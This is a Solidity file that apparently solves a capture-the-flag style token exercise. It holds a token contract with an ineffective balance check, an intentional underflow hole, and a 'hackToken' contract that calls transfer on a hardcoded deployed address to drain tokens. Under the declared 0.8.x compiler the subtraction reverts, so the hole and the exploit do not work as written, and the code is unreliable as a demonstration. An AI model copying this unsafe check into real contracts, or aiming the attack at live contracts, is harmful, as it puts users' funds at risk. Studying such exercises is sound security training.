// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

contract hackToken{

  Token hacktoken = Token(0xf6c849Bc9636e022223B4A4Bdda509C1E26D8011);

  function target(address _address,uint _val) public {

  hacktoken.transfer(_address, _val);
  }
}